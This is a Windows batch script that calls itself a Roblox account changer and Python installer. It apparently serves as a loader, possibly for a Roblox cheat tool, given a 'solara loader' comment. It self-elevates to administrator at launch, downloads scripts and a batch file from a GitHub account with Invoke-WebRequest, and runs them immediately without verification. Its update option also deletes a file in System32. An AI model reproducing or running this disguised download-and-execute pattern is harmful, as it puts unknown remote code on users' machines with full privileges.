@echo off
setlocal enabledelayedexpansion
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
REM              SETUP
TITLE Roblox Account Changer
Color 0f
mode con cols=89 lines=29
for /F %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
chcp 65001 > nul
cls

REM               LOADLOGO
:LOADLOGO
echo]
echo]
echo %ESC%[95m    ██████╗  ██████╗     ██████╗ ██████╗
echo     ██╔══██╗██╔════╝    ██╔════╝██╔════╝
echo     ██║  ██║██║  ███╗   ██║     ██║     
echo     ██║  ██║██║   ██║   ██║     ██║     
echo     ██████╔╝╚██████╔╝██╗╚██████╗╚██████╗
echo     ╚═════╝  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝
echo               File and  Python installer
ping 192.0.2.2 -n 1 -w 1000 > nul
cls

:Login
TITLE @Ewinnery python + programm installer
cls
CALL :LOGO
echo]
echo     %ESC%[90m^> %ESC%[91mВыберите действие
echo]
echo]
echo     %ESC%[90m^>I %ESC%[33mInstall Python
echo     %ESC%[90m^>1 %ESC%[32mColorChanger.py
echo     %ESC%[90m^>2 %ESC%[32mCursorChecker.py
echo     %ESC%[90m^>C %ESC%[32mCheck updates

echo]
echo]
echo %ESC%[90m^>Выберите действие:
SET account=
SET /P account=

IF /I '%account%'=='I' goto install
IF /I '%account%'=='1' goto download1
IF /I '%account%'=='2' goto download2
IF /I '%account%'=='C' goto updatechecker
:: solara loader

:: python installer
:install
cls
CALL :LOGO
echo]
echo %ESC%[32mInstalling Python 3 and pip...%ESC%[33m
set PYTHON_VERSION=3.10.0
set PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe
set PIP_URL=https://bootstrap.pypa.io/get-pip.py
set PYTHON_INSTALLER=python-%PYTHON_VERSION%-amd64.exe
set PIP_INSTALLER=get-pip.py

echo Downloading Python 3 installer from %PYTHON_URL%...
curl -L -o %PYTHON_INSTALLER% %PYTHON_URL%
echo Installing Python 3...
start /wait %PYTHON_INSTALLER% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
echo Installing pip...
curl -L -o %PIP_INSTALLER% %PIP_URL%
python %PIP_INSTALLER%
echo Cleaning up...
del %PYTHON_INSTALLER%
del %PIP_INSTALLER%
echo Done.
pause
goto :Login
:: end

:: installer1
:download1
set "url=https://raw.githubusercontent.com/FileInstaller/RPSRC/main/Colorchangers.py"
set "output=Colorchangers.py"
goto download

:: installer2
:download2
pip install pyautogui pynput
set "url=https://raw.githubusercontent.com/FileInstaller/RPSRC/main/cursor.py"
set "output=CursorMover.py"
goto download

:updatechecker
set "url=https://raw.githubusercontent.com/FileInstaller/RPSRC/main/Otherscript.bat"
set "outputbat=Otherscript.bat"
goto downloadbat

:download
if exist %output% (
echo %ESC%[32mFile %output% already exists. Opening file...
start python %output%
) else (
echo Downloading %url%...
powershell -Command "Invoke-WebRequest -Uri !url! -OutFile !output!"
if exist !output! (
echo %ESC%[32mFile downloaded successfully. Running file...
start python !output!
) else (
echo %ESC%[31mFailed to download file. Please check the URL and try again.
)
)
pause
goto Login


:downloadbat
if exist %outputbat% (
echo %ESC%[32mFile %outputbat% already exists. Updating file.....
del C:\Windows\System32\Otherscript.bat
del %outputbat%
echo Downloading %url%...
powershell -Command "Invoke-WebRequest -Uri !url! -OutFile !outputbat!"
if exist !outputbat! (
echo File downloaded successfully. Running file...
start !outputbat!
) else (
echo %ESC%[31mFailed to receive update, its may not released
)
)
pause
goto Login

:: end


:LOGO
echo]
echo]
echo %ESC%[95m    ██████╗  ██████╗     ██████╗ ██████╗
echo     ██╔══██╗██╔════╝    ██╔════╝██╔════╝
echo     ██║  ██║██║  ███╗   ██║     ██║     
echo     ██║  ██║██║   ██║   ██║     ██║     
echo     ██████╔╝╚██████╔╝██╗╚██████╗╚██████╗
echo     ╚═════╝  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝
echo                     Python installer


